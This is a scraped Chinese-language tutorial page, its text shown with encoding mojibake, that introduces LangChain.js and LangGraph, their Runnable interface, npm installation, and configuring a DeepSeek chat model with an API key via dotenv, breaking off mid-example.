                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">langchain &amp; langgraph</h2>
<h3 data-id="heading-1">ç®€ä»‹</h3>
<h4 data-id="heading-2">langchain</h4>
<p>è®¾è®¡ç†å¿µ<br/>
<code>langchain</code>Â çš„è®¾è®¡ç›®æ ‡æ˜¯æŠŠå„ç§ä¸å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰äº¤äº’çš„å¸¸è§æ„å»ºå—æŠ½è±¡æˆé«˜åº¦å¯ç»„åˆã€å¯é‡ç”¨çš„ç»„ä»¶ï¼Œé™ä½å°†æ¨¡å‹èƒ½åŠ›åµŒå…¥åº”ç”¨çš„é—¨æ§›ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯â€œæŠŠæ¨¡å‹ä½œä¸ºå‡½æ•°æ¥è°ƒç”¨å¹¶ç»„åˆè¿™äº›å‡½æ•°â€â€”â€”é€šè¿‡ç»Ÿä¸€çš„æ¥å£ï¼ˆå¦‚Â <code>Runnable</code>ï¼‰æ¥é“¾æ¥æç¤ºæ¨¡æ¿ã€æ¨¡å‹è°ƒç”¨ã€è§£æå™¨ã€æ£€ç´¢å™¨å’Œå·¥å…·ç­‰ï¼Œä»è€Œä»¥é“¾å¼æ–¹å¼å¿«é€Ÿæ„å»ºæ–‡æœ¬å¤„ç†æµæ°´çº¿ã€‚</p>
<p>ç‰¹ç‚¹</p>
<ul>
<li>ç»„ä»¶åŒ–ä¸å¯ç»„åˆæ€§ï¼šå¤§å¤šæ•°ç»„ä»¶å®ç°ç›¸åŒçš„Â <code>Runnable</code>Â æ¥å£ï¼Œæ”¯æŒÂ <code>invoke</code>ã€<code>batch</code>ã€<code>stream</code>Â ç­‰ç»Ÿä¸€è°ƒç”¨æ–¹å¼ï¼Œä¾¿äºé€šè¿‡Â <code>pipe</code>Â æˆ–å…¶ä»–ç»„åˆæ–¹æ³•æ„å»ºå¤æ‚æµç¨‹ã€‚</li>
<li>ä¸°å¯Œçš„é›†æˆï¼šä¸ä¸»æµæ¨¡å‹æä¾›å•†ï¼ˆå¦‚ OpenAIã€Anthropicã€Google ç­‰ï¼‰æœ‰å¯¹æ¥åŒ…ï¼Œæ”¯æŒæ£€ç´¢ï¼ˆretrieverï¼‰ã€å‘é‡æ•°æ®åº“ã€å·¥å…·è°ƒç”¨ã€å¤–éƒ¨ API ç­‰ã€‚æŠ¹å¹³äº†ä¾›åº”å•†ä¹‹é—´çš„ä¸åŒ.</li>
<li>è½»é‡ä¸çµæ´»ï¼šé€‚åˆå®ç°çŸ­æ—¶ã€æ— çŠ¶æ€æˆ–å¼±çŠ¶æ€çš„ä»»åŠ¡ï¼Œé€‚é…å¿«é€ŸåŸå‹å’Œå•æ¬¡è°ƒç”¨åœºæ™¯ã€‚</li>
<li>å¼€å‘ä½“éªŒï¼šæä¾›æç¤ºæ¨¡æ¿ã€è§£æå™¨ã€å¸¸ç”¨é“¾ï¼ˆchainsï¼‰å’Œä»£ç†ï¼ˆagentsï¼‰æ¨¡å¼ï¼Œé™ä½æ„å»ºå¸¸è§åŠŸèƒ½ï¼ˆå¦‚é—®ç­”ã€æ‘˜è¦ã€ä¿¡æ¯æŠ½å–ï¼‰çš„å¤æ‚åº¦ã€‚</li>
</ul>
<p>é€‚ç”¨åœºæ™¯</p>
<ul>
<li>å•è½®é—®ç­”ç³»ç»Ÿï¼ˆå¦‚çŸ¥è¯†åº“æŸ¥è¯¢ï¼‰</li>
<li>æ–‡æ¡£æ‘˜è¦ä¸æŠ½å–</li>
<li>å›ºå®šæµç¨‹çš„æ•°æ®å¤„ç†ï¼ˆä¾‹å¦‚æ•°æ®æ¸…æ´—åè°ƒç”¨æ¨¡å‹ç”ŸæˆæŠ¥å‘Šï¼‰</li>
<li>å¿«é€ŸåŸå‹ä¸ PoCï¼ˆProof of Conceptï¼‰</li>
<li>åŸºç¡€çš„ä»£ç†æ¨¡å¼ä¸å·¥å…·è°ƒç”¨ï¼ˆå¦‚ ReAct æ¨¡å¼ï¼‰</li>
</ul>
<p>è¿™äº›åœºæ™¯é€šå¸¸ä¸éœ€è¦å¤æ‚çš„å¾ªç¯é€»è¾‘æˆ–é•¿æœŸçŠ¶æ€ç®¡ç†ï¼Œé€‚åˆä½¿ç”¨é“¾å¼æ¶æ„å¿«é€Ÿæ„å»ºå¹¶è¿­ä»£ã€‚</p>
<h4 data-id="heading-3">langgraph</h4>
<p>è®¾è®¡ç†å¿µ<br/>
<code>langgraph</code>Â çš„è®¾è®¡ç›®æ ‡æ˜¯æŠŠæ™ºèƒ½åº”ç”¨çš„æ§åˆ¶æµä»çº¿æ€§é“¾å¼æŠ½è±¡æå‡ä¸ºæœ‰å‘å›¾ï¼ˆgraphï¼‰ç»“æ„ï¼Œä»¥ä¾¿æ›´å¥½åœ°è¡¨è¾¾å¤šæ­¥éª¤å†³ç­–ã€æ¡ä»¶åˆ†æ”¯ã€å¹¶è¡Œå­ä»»åŠ¡ã€é•¿æœŸçŠ¶æ€ä¸äººæœºååŒã€‚é€šè¿‡æŠŠæ¯ä¸€æ­¥å·¥ä½œæµå»ºæ¨¡ä¸ºèŠ‚ç‚¹ï¼ˆnodeï¼‰å¹¶ç”¨è¾¹ï¼ˆedgeï¼‰æè¿°æ•°æ®ä¸æ§åˆ¶æµï¼Œæä¾›æ›´å¼ºçš„å¯è§‚æµ‹æ€§ã€é‡è¯•ã€æŒä¹…åŒ–ä¸å¯æ’æ‹”çš„äººå·¥å¹²é¢„ç‚¹ã€‚</p>
<p>ç‰¹ç‚¹</p>
<ul>
<li>å›¾å¼å·¥ä½œæµç¼–æ’ï¼šä½¿ç”¨æœ‰å‘å›¾è¡¨è¾¾å¤æ‚æµç¨‹ï¼ŒèŠ‚ç‚¹å¯å¤ç”¨ã€å­å›¾åµŒå¥—ï¼Œæ”¯æŒæ¡ä»¶åˆ†æ”¯ä¸å¹¶è¡Œæ‰§è¡Œã€‚</li>
<li>çŠ¶æ€ä¸æŒä¹…åŒ–ï¼šå†…ç½®æˆ–å¯é…ç½®çš„æ£€æŸ¥ç‚¹ï¼ˆcheckpointï¼‰ä¸æŒä¹…åŒ–æœºåˆ¶ï¼Œé€‚åˆé•¿ä»»åŠ¡ä¸å¯æ¢å¤çš„æµç¨‹ã€‚</li>
<li>äººæœºååŒï¼šå¤©ç„¶æ”¯æŒäººå·¥å¹²é¢„ç‚¹ï¼ˆhuman-in-the-loopï¼‰ã€å®¡æ‰¹æµä¸å›æ»šæœºåˆ¶ï¼Œä¾¿äºåœ¨é«˜é£é™©åœºæ™¯ä¸­ä»‹å…¥ã€‚</li>
<li>å¤šæ™ºèƒ½ä½“ä¸å­å›¾ï¼šæ”¯æŒå¤šä¸ªæ™ºèƒ½ä½“æˆ–å­å›¾åä½œã€é€šä¿¡ä¸ç»“æœæ•´åˆï¼Œé€‚åˆå¤æ‚åä½œåœºæ™¯ã€‚</li>
<li>è§‚æµ‹ä¸è°ƒè¯•ï¼šé€šå¸¸é…åˆå¯è§†åŒ–å·¥å…·æˆ–è¿½è¸ªç³»ç»Ÿï¼ˆtracingï¼‰æ¥è§‚å¯Ÿæ‰§è¡Œè·¯å¾„ã€ç›‘æ§è¿è¡Œæ—¶æ•°æ®ä¸è¯Šæ–­å¤±è´¥åŸå› ã€‚</li>
</ul>
<p>é€‚ç”¨åœºæ™¯</p>
<ul>
<li>éœ€è¦å¤šæ­¥éª¤å†³ç­–çš„æ™ºèƒ½å®¢æœç³»ç»Ÿï¼ˆä¾‹å¦‚ï¼šæŒ‰ç”¨æˆ·é—®é¢˜åŠ¨æ€é€‰æ‹©æ£€ç´¢ â†’ é—®ç­” â†’ äººå·¥å®¡æ‰¹ï¼‰</li>
<li>é•¿æœŸäº¤äº’çš„å¯¹è¯å¼åº”ç”¨ï¼ˆå¦‚æ•™è‚²è¾…å¯¼ã€æŒç»­ä»»åŠ¡ç®¡ç†ï¼‰</li>
<li>é‡‘èæˆ–åˆè§„å®¡æ‰¹æµç¨‹ï¼ˆæ ¹æ®è§„åˆ™å’Œé‡‘é¢å†³å®šæ˜¯å¦éœ€è¦äººå·¥å®¡æ‰¹ï¼‰</li>
<li>å¤šæ™ºèƒ½ä½“åä½œç³»ç»Ÿï¼ˆå¦‚å›¢é˜Ÿä»»åŠ¡åˆ†é…ä¸è¿›åº¦åè°ƒï¼‰</li>
<li>é«˜é£é™©æ“ä½œæµç¨‹ï¼ˆä¾‹å¦‚ç”Ÿäº§ç³»ç»Ÿå˜æ›´éœ€äººå·¥ç¡®è®¤ï¼‰</li>
<li>æ”¯æŒå›æ»šã€æŒä¹…åŒ–ä¸é•¿ä»»åŠ¡çš„è‡ªåŠ¨åŒ–æµç¨‹ï¼ˆå¦‚å¤æ‚æ–‡æ¡£ç”Ÿæˆã€æ•°æ®å¤„ç†ç®¡é“ï¼‰</li>
</ul>
<p>è¿™äº›åœºæ™¯é€šå¸¸éœ€è¦ç²¾ç»†çš„æµç¨‹æ§åˆ¶ã€é•¿æœŸçŠ¶æ€ç®¡ç†æˆ–å¤æ‚å†³ç­–é€»è¾‘ï¼Œé€‚åˆä½¿ç”¨å›¾ç»“æ„è¿›è¡Œç¼–æ’ã€‚</p>
<h2 data-id="heading-4">å®‰è£…</h2>
<h3 data-id="heading-5">ä¸»åŒ…</h3>
<pre><code class="hljs language-java" lang="java">npm install langchain <span class="hljs-meta">@langchain</span>/core <span class="hljs-comment">//å½“å‰æœ€æ–°ç‰ˆæœ¬æ˜¯1.0.2</span>
Copy
</code></pre>
<p><code>@langchain/core</code>Â æ˜¯æœ€åº•å±‚åŒ…ï¼Œ<code>langchain</code>Â ç”Ÿæ€ç³»ç»Ÿä¸­é™¤äº†Â <code>langsmith</code>Â å…¶ä»–æ‰€æœ‰è½¯ä»¶åŒ…éƒ½ä¾èµ–è¯¥åŒ…ã€‚å®ƒåŒ…å«äº†å…¶ä»–è½¯ä»¶åŒ…æ‰€éœ€è¦ä½¿ç”¨çš„åŸºç±»ã€‚</p>
<h3 data-id="heading-6">é›†æˆåŒ…</h3>
<p>å„ä¸ªç¬¬ä¸‰æ–¹æä¾›çš„é›†æˆåŒ…ä¾èµ–ä¸»åŒ…ï¼Œä¾‹å¦‚ï¼š<code>@langchain/anthropic</code>ï¼ˆä¸“é—¨ä¸ Anthropic æä¾›çš„æ¨¡å‹å¯¹æ¥ï¼‰ã€<code>@langchain/community</code>ï¼ˆæ”¶é›†ä¸€äº›ç”±ç¤¾åŒºè´¡çŒ®ä½†å¹¶æœªè¢«Â <code>langchain</code>Â æ”¶çº³çš„åŒ…ï¼‰ã€‚è¿™äº›åŒ…ä¸éœ€è¦åœ¨é¡¹ç›®å¯åŠ¨æ—¶å…¨éƒ¨å®‰è£…ï¼ŒæŒ‰éœ€å¼•å…¥å³å¯ã€‚ä½†è¦æ³¨æ„ï¼šé›†æˆåŒ…éƒ½ä¾èµ–ä¸»åŒ…ï¼Œæœ€å¥½åœ¨é¡¹ç›®ä¸­å¼ºåˆ¶æŒ‡å®šä¸»åŒ…ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// package.json</span>
<span class="hljs-string">"overrides"</span>: {
  <span class="hljs-string">"@langchain/core"</span>: <span class="hljs-string">"^1.0.2"</span>
}
<span class="hljs-built_in">Copy</span>
</code></pre>
<p>å¸¸è§é›†æˆåŒ…ç¤ºä¾‹ï¼š</p>
<ul>
<li><code>@langchain/community</code>ï¼šä¸€äº›ç”±ç¤¾åŒºè´¡çŒ®ä½†å¹¶æœªè¢«Â <code>langchain</code>Â æ”¶çº³çš„åŒ…</li>
<li><code>@langchain/openai</code>ï¼šåœ¨Â <code>langchain</code>Â ä¸­ä½¿ç”¨ OpenAI çš„å¤§æ¨¡å‹æœåŠ¡</li>
<li><code>@langchain/langgraph</code>ï¼šä½¿ç”¨æœ‰å‘å›¾çš„æ–¹å¼æ„å»ºå¤šæ™ºèƒ½ä½“æˆ–æœ‰çŠ¶æ€åº”ç”¨</li>
<li><code>langsmith</code>ï¼šç”¨äºå¯¹æ™ºèƒ½ä½“åº”ç”¨ç›‘æ§ä¸è§‚æµ‹çš„åº“</li>
</ul>
<p><code>langchain</code>Â åŒ…çš„ç»„ç»‡ä¾èµ–å…³ç³»:ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11ef0b2a6a244384b0f69bc9b786feec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhlX21hc3NpZg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873824&amp;x-signature=St5mbD%2B%2F61o3GGN6QaXv0v1MzWI%3D" alt="image-20250823225140268.png" loading="lazy"/></p>
<h2 data-id="heading-7">Runnable</h2>
<p>åœ¨æ­£å¼å¼€å§‹ä¹‹å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯Â <code>Runnable</code>ã€‚</p>
<p>åœ¨Â <code>LangChain.js</code>Â ä¸­ï¼Œ<code>Runnable</code>Â æ˜¯ä¸€ä¸ªæ ¸å¿ƒçš„æ¥å£ï¼Œå®ƒå®šä¹‰äº†ä¸€å¥—ç»Ÿä¸€çš„ã€å¯ç»„åˆçš„æ–¹æ³•ï¼Œç”¨äºæ‰§è¡Œå’Œç®¡ç†å„ç§ç»„ä»¶ã€‚å‡ ä¹æ‰€æœ‰ LangChain ç»„ä»¶ï¼Œå¦‚è¯­è¨€æ¨¡å‹ã€æç¤ºæ¨¡æ¿ã€é“¾ã€è§£æå™¨ã€æ£€ç´¢å™¨ç­‰ï¼Œéƒ½å®ç°äº†Â <code>Runnable</code>Â æ¥å£ã€‚å› æ­¤Â <code>langchain</code>Â ä¸­çš„å¤§éƒ¨åˆ†ç»„ä»¶éƒ½å…·å¤‡ä¸€ç»„ç›¸åŒçš„æ ‡å‡†åŒ–è°ƒç”¨æ–¹å¼ï¼Œå¯ä»¥æå¤§åœ°ç®€åŒ–ç»„ä»¶çš„ä½¿ç”¨å’Œç»„åˆã€‚</p>
<p>å¯¹äºä»»æ„å®ç°äº†Â <code>Runnable&lt;I, O&gt;</code>Â æ¥å£çš„å¯¹è±¡ï¼ˆå…¶ä¸­Â <code>I</code>Â æ˜¯è¾“å…¥ç±»å‹ï¼Œ<code>O</code>Â æ˜¯è¾“å‡ºç±»å‹ï¼‰ï¼Œå®ƒéƒ½æä¾›äº†ä»¥ä¸‹æ ¸å¿ƒæ‰§è¡Œæ–¹æ³•ï¼š</p>



































<table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¿”å›å€¼</th><th>åŠŸèƒ½ä¸ç”¨é€”</th></tr></thead><tbody><tr><td><code>invoke(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>Promise&lt;O&gt;</code></td><td>åŸºç¡€è°ƒç”¨ï¼šæ¥æ”¶å•ä¸ªè¾“å…¥Â <code>input</code>Â å¹¶æ‰§è¡ŒÂ <code>Runnable</code>ï¼Œè¿”å›ä¸€ä¸ªÂ <code>Promise</code>ï¼Œè§£æä¸ºæœ€ç»ˆè¾“å‡ºÂ <code>O</code>ã€‚<code>options</code>Â å¯ä¼ è¿è¡Œæ—¶é…ç½®ï¼ˆå›è°ƒã€æ ‡ç­¾ã€å…ƒæ•°æ®ç­‰ï¼‰ã€‚</td></tr><tr><td><code>batch(inputs, options?)</code></td><td><code>inputs: I[]</code><br/><code>options?: Partial&lt;RunnableConfig&gt; Partial&lt;RunnableConfig&gt;[]</code></td><td><code>Promise&lt;O[]&gt;</code></td><td>æ‰¹é‡è°ƒç”¨: é«˜æ•ˆåœ°å¤„ç†ä¸€ç»„è¾“å…¥ <code>inputs</code>ã€‚è¿”å›ä¸€ä¸ª <code>Promise</code>ï¼Œè¯¥ <code>Promise</code> ä¼šè§£æä¸ºä¸€ä¸ªè¾“å‡ºæ•°ç»„ <code>O[]</code>ã€‚<code>options</code> å¯ä»¥æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼ˆåº”ç”¨äºæ‰€æœ‰è¾“å…¥ï¼‰æˆ–ä¸€ä¸ªé…ç½®å¯¹è±¡æ•°ç»„ï¼ˆæ¯ä¸ªè¾“å…¥å¯¹åº”ä¸€ä¸ªé…ç½®ï¼‰ã€‚åº•å±‚å®ç°ï¼ˆå¦‚ API è°ƒç”¨ï¼‰é€šå¸¸èƒ½ä¼˜åŒ–æ‰¹é‡è¯·æ±‚ã€‚</td></tr><tr><td><code>stream(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>AsyncGenerator&lt;O, void, unknown&gt;</code></td><td>æµå¼è¾“å‡ºï¼šè¿”å›å¼‚æ­¥ç”Ÿæˆå™¨ï¼Œé€‚ç”¨äºä½å»¶è¿Ÿã€é€æ­¥è¾“å‡ºï¼ˆå¦‚èŠå¤©é€å­—è¾“å‡ºï¼‰ã€‚</td></tr><tr><td><code>streamLog(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>AsyncGenerator&lt;RunLogPatch, void, unknown&gt;</code></td><td>æµå¼æ—¥å¿—ï¼šä»¥æµçš„å½¢å¼è¿”å›æ‰§è¡Œè¿‡ç¨‹çš„æ—¥å¿—è¡¥ä¸ï¼ŒåŒ…å«ä¸­é—´å€¼ã€çŠ¶æ€å˜åŒ–ä¸é”™è¯¯ä¿¡æ¯ï¼Œä¾¿äºç›‘æ§ä¸è°ƒè¯•ã€‚</td></tr></tbody></table>
<p>é™¤äº†æ ¸å¿ƒæ‰§è¡Œæ–¹æ³•ï¼Œ<code>Runnable</code>Â è¿˜æä¾›äº†ä¸€ç³»åˆ—ç»„åˆä¸é…ç½®æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•ä¸æ‰§è¡ŒÂ <code>Runnable</code>ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°çš„Â <code>Runnable</code>Â å®ä¾‹ï¼Œä»è€Œå®ç°å‡½æ•°å¼ç¼–ç¨‹ä¸é“¾å¼æ„å»ºï¼š</p>



































<table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¿”å›å€¼</th><th>åŠŸèƒ½ä¸ç”¨é€”</th></tr></thead><tbody><tr><td><code>pipe(co)</code></td><td><code>co: RunnableLike&lt;NewOutput&gt;</code></td><td><code>Runnable&lt;I, NewOutput&gt;</code></td><td>ç®¡é“ç»„åˆï¼šå°†å½“å‰Â <code>Runnable</code>Â çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªÂ <code>RunnableLike</code>Â çš„è¾“å…¥ï¼Œè¿”å›æ–°çš„çº¿æ€§æ‰§è¡Œæµç¨‹ã€‚</td></tr><tr><td><code>withConfig(config)</code></td><td><code>config: RunnableConfig</code></td><td><code>this</code>Â (æ–°å®ä¾‹)</td><td>ç»‘å®šé»˜è®¤é…ç½®ï¼šè¿”å›å¸¦é»˜è®¤è¿è¡Œæ—¶é…ç½®çš„Â <code>Runnable</code>Â å®ä¾‹ï¼Œä¾¿äºé¢„è®¾å›è°ƒã€æ ‡ç­¾ç­‰ã€‚</td></tr><tr><td><code>withListParser(parser)</code></td><td><code>parser: ListParser</code></td><td><code>Runnable&lt;I, string[]&gt;</code></td><td>åˆ—è¡¨è§£æï¼šè¿”å›æ–°Â <code>Runnable</code>ï¼Œå…¶è¾“å‡ºä¼šç»è¿‡Â <code>ListParser</code>Â è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ•°ç»„ã€‚</td></tr><tr><td><code>withTypes&lt;NewI, NewO&gt;()</code></td><td>(æ³›å‹å‚æ•°)</td><td><code>Runnable&lt;NewI, NewO&gt;</code></td><td>ç±»å‹è½¬æ¢ï¼ˆTypeScriptï¼‰ï¼šä¸æ”¹å˜è¡Œä¸ºï¼Œä»…æ”¹å˜ç±»å‹ç­¾åï¼Œä¾¿äºç±»å‹é€‚é…ã€‚</td></tr></tbody></table>
<h2 data-id="heading-8">æ¨¡å‹è°ƒç”¨</h2>
<p>å¼€å‘æ™ºèƒ½åº”ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯å°†å¤§æ¨¡å‹é›†æˆåˆ°é¡¹ç›®ä¸­ã€‚è¿™éƒ¨åˆ†å·¥ä½œå¯ä»¥é€šè¿‡Â <code>langchain</code>Â æä¾›çš„é›†æˆåŒ…æ¥å®ç°ã€‚</p>
<p>ç”±äºå„ä¸ªæ¨¡å‹å‚å•†æä¾›çš„æ¨¡å‹æ¥å£å·®å¼‚ï¼Œåœ¨Â <code>langchain</code>Â ä¸­è°ƒç”¨ä¸åŒçš„æ¨¡å‹é¦–å…ˆè¦å®‰è£…å¯¹åº”çš„é›†æˆåŒ…ï¼Œç›®å‰å¸¸è§çš„æ¨¡å‹å‚å•†åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>openai</code>:Â <code>@langchain/openai</code></li>
<li><code>anthropic</code>:Â <code>@langchain/anthropic</code></li>
<li><code>google-gemini</code>:Â <code>@langchain/google-genai</code></li>
<li><code>mistralai</code>:Â <code>@langchain/mistralai</code></li>
<li><code>groq</code>:Â <code>@langchain/groq</code></li>
<li><code>vertexai</code>:Â <code>@langchain/google-vertexai</code></li>
</ul>
<p>è¿™é‡Œä»¥Â <code>deepseek</code>ï¼ˆæˆ–ä»»æ„æ”¯æŒèŠå¤©æ¥å£çš„æ¨¡å‹ï¼‰ä¸ºä¾‹ï¼Œå…¶ä»–æ¨¡å‹åŒ…å¯å‚ç…§ç›¸åº”çš„é›†æˆæ–‡æ¡£ã€‚å¦‚æœä½¿ç”¨çš„æ˜¯æœ¬åœ°éƒ¨ç½²æ¨¡å‹ï¼Œè¯·æŸ¥çœ‹å¯¹åº”çš„ LLM é›†æˆè¯´æ˜ã€‚</p>
<p>æç¤ºï¼šå¦‚æœä½¿ç”¨ç¬¬ä¸‰æ–¹ä»£ç†ï¼ˆgatewayï¼‰å…¼å®¹æŸä¸ªæ ‡å‡†ï¼ˆä¾‹å¦‚ OpenAI æ ‡å‡†ï¼‰ï¼Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹åªéœ€ä½¿ç”¨å¯¹åº”æ ‡å‡†çš„é›†æˆåŒ…ï¼ˆä¾‹å¦‚Â <code>@langchain/openai</code>ï¼‰å³å¯ä¸è¯¥ä»£ç†é€šä¿¡ã€‚</p>
<h3 data-id="heading-9">ç”³è¯· key</h3>
<p>åœ¨è°ƒç”¨å¤§æ¨¡å‹ä¹‹å‰éœ€è¦åˆ°æ¨¡å‹æä¾›å•†å¤„ç”³è¯· API keyã€‚æ¼”ç¤ºä¸­æåˆ°ä½¿ç”¨Â <code>deepseek</code>Â çš„ keyï¼Œæ³¨å†Œååœ¨å¹³å°ç”Ÿæˆ key å¹¶è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­å³å¯ã€‚</p>
<h3 data-id="heading-10">å®‰è£…é›†æˆåŒ…ï¼ˆç¤ºä¾‹ï¼‰</h3>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">@langchain</span>/deepseek
import { ChatDeepSeek } <span class="hljs-selector-tag">from</span> '<span class="hljs-keyword">@langchain</span>/deepseek'
Copy
</code></pre>
<h3 data-id="heading-11">åˆ›å»ºæ¨¡å‹</h3>
<ol>
<li>
<p>æ·»åŠ ç¯å¢ƒå˜é‡</p>
<p><code>@langchain/deepseek</code>Â åŒ…åœ¨åˆå§‹åŒ–æ—¶ï¼Œä¼šé»˜è®¤ä½¿ç”¨Â <code>DEEPSEEK_API_KEY</code>Â ä¸­çš„å€¼æ¥è¯»å– API keyã€‚å¼€å‘æ—¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä¼ å…¥Â <code>apiKey</code>ï¼Œä½†ç”Ÿäº§ç¯å¢ƒå»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">'ä½ çš„æ¨¡å‹åç§°deepseek-chat/deepseek-reasoner'</span>, <span class="hljs-comment">// deepseek æä¾›çš„æ¨¡å‹åç§°</span>
  temperature: <span class="hljs-number">0.5</span>,
  apiKey: <span class="hljs-string">'xxxxx'</span>
});
</code></pre>
<p>æ›´æ¨èä½¿ç”¨Â <code>dotenv</code>Â æ³¨å…¥ç¯å¢ƒå˜é‡ï¼š</p>
<ol>
<li>
<p>æ–°å»ºÂ <code>.env</code>Â æ–‡ä»¶å¹¶è®¾ç½® key</p>
<pre><code class="hljs language-ini" lang="ini">// .env
<span class="hljs-attr">DEEPSEEK_API_KEY</span>=your-api-key
Copy
</code></pre>
</li>
<li>
<p>å®‰è£…å¹¶åŠ è½½Â <code>dotenv</code></p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> dotenv
</code></pre>
</li>
<li>
<p>åœ¨ä»£ç ä¸­æ³¨å…¥ç¯å¢ƒå˜é‡</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> dotenv from <span class="hljs-string">'dotenv'</span>
dotenv.<span class="hljs-built_in">config</span>()
